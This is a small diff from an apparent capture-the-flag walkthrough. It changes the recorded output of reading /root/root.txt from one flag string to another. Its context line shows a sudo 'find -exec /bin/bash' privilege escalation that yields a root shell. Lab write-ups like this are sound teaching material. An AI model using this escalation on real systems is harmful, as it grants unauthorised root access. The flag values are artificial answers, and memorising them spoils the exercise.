@@ -186,6 +186,6 @@ sudo /usr/bin/find . -exec /bin/bash \; -quit
 ### Step 5.3: Capture Final Flag 3
 ```bash
 cat /root/root.txt
-# Output: FLAG{r00t_gtf0b1n5_pr1v3sc_succ3ss_8821}
+# Output: FLAG{4p3x_d3f3ns3_pwn3d_5521}
 ```
 Target completely compromised!
